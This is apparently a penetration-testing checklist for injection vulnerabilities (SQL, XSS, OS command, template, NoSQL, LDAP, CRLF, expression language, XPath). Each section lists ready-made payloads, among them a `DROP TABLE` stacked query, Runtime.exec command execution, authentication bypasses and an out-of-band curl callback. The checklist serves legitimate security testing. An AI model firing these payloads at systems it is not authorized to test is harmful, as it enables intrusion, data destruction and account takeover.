# A05:2025 — Injection

## SQL Injection
- [ ] Test all parameters with single quote: `'`, `''`, `'OR'1'='1`
- [ ] Test UNION-based: `' UNION SELECT NULL,NULL--`
- [ ] Test blind boolean: `' AND 1=1--` vs `' AND 1=2--` (different responses?)
- [ ] Test time-based blind: `' AND SLEEP(5)--`, `'; WAITFOR DELAY '0:0:5'--`
- [ ] Test in ORDER BY, GROUP BY, LIMIT clauses — often unparameterized
- [ ] Test in HTTP headers: `X-Forwarded-For`, `Referer`, `User-Agent` (logged to DB)
- [ ] Test JSON body parameters: `{"id": "1 OR 1=1"}`
- [ ] Test second-order SQLi: inject payload in profile, trigger when admin views
- [ ] Check for stacked queries: `'; DROP TABLE test--` (PostgreSQL, MSSQL)

## Cross-Site Scripting (XSS)
- [ ] Test reflected XSS in every parameter echoed in response
- [ ] Test stored XSS in profile fields, comments, filenames, metadata
- [ ] Test DOM XSS via URL fragments, `document.location`, `innerHTML` sinks
- [ ] Context-specific payloads: HTML (`<script>`), attribute (`" onmouseover=`), JS (`';alert(1)//`)
- [ ] Test filter bypasses: case variation, encoding, tag nesting, event handlers
- [ ] Check for XSS in error messages that reflect user input
- [ ] Test XSS in file upload names: `"><img src=x onerror=alert(1)>.png`

## OS Command Injection
- [ ] Test command separators: `;`, `|`, `||`, `&&`, `\n`, `` ` ``
- [ ] Test in parameters that interact with OS: filename, IP address, URL, email
- [ ] Blind detection: `; sleep 5`, `| ping -c 5 127.0.0.1`
- [ ] OOB detection: `` ; curl http://COLLABORATOR `` or `` | nslookup COLLABORATOR ``
- [ ] Test with command substitution: `$(whoami)`, `` `whoami` ``

## Server-Side Template Injection (SSTI)
- [ ] Polyglot detection: `${{<%[%'"}}%\`
- [ ] Jinja2/Twig: `{{7*7}}`, `{{config}}`, `{{''.__class__.__mro__}}`
- [ ] Freemarker: `${7*7}`, `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- [ ] Pebble: `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime')... %}`
- [ ] ERB (Ruby): `<%= 7*7 %>`, `<%= system("id") %>`
- [ ] Velocity: `#set($x=7*7)${x}`
- [ ] Test in email templates, PDF generators, report templates, notification bodies

## NoSQL Injection
- [ ] MongoDB operator injection: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
- [ ] Test `$regex`: `{"password": {"$regex": "^a"}}`
- [ ] Test `$gt`, `$lt` operators for auth bypass: `{"password": {"$gt": ""}}`
- [ ] URL parameter syntax: `username[$ne]=&password[$ne]=`
- [ ] Test JavaScript injection in `$where`: `$where: "this.password == 'x' || 1==1"`

## LDAP Injection
- [ ] Test in login forms: `*`, `)(cn=*`, `*)(uid=*))(|(uid=*`
- [ ] Auth bypass: `admin)(&)`, `admin)(|(password=*))`
- [ ] Test for information disclosure via wildcard queries

## Header Injection (CRLF)
- [ ] Test CRLF injection: `%0d%0aSet-Cookie:evil=1`, `%0d%0aLocation:https://evil.example`
- [ ] Test in redirect parameters, `Host` header, custom headers
- [ ] HTTP response splitting: inject headers to poison cache or inject content

## Log Injection
- [ ] Inject newlines and fake log entries via user input: `\nINFO: Admin logged in`
- [ ] Test for log forging in username, search, and error-logged parameters
- [ ] Check if ANSI escape codes are processed in log viewers

## Expression Language Injection
- [ ] Java EL: `${7*7}`, `${applicationScope}`
- [ ] Spring SpEL: `#{7*7}`, `#{T(java.lang.Runtime).getRuntime().exec('id')}`
- [ ] OGNL (Struts): `%{7*7}`, `%{#cmd='id',#iswin=...}`
- [ ] Test in any parameter processed by expression evaluators

## XPath Injection
- [ ] Test in XML-backed search/login: `' or '1'='1`, `' or ''='`
- [ ] Extract data: `' or name()='username` iteratively

## Input Vectors to Cover
- [ ] URL path segments and query parameters
- [ ] POST body (form-urlencoded, JSON, XML, multipart)
- [ ] HTTP headers: `Cookie`, `Referer`, `User-Agent`, `X-Forwarded-For`, `Host`
- [ ] File upload filenames, metadata, and content
- [ ] WebSocket message payloads

---
> Cross-reference skills: `sqli-testing`, `xss-testing`, `command-injection`, `ssti-testing`
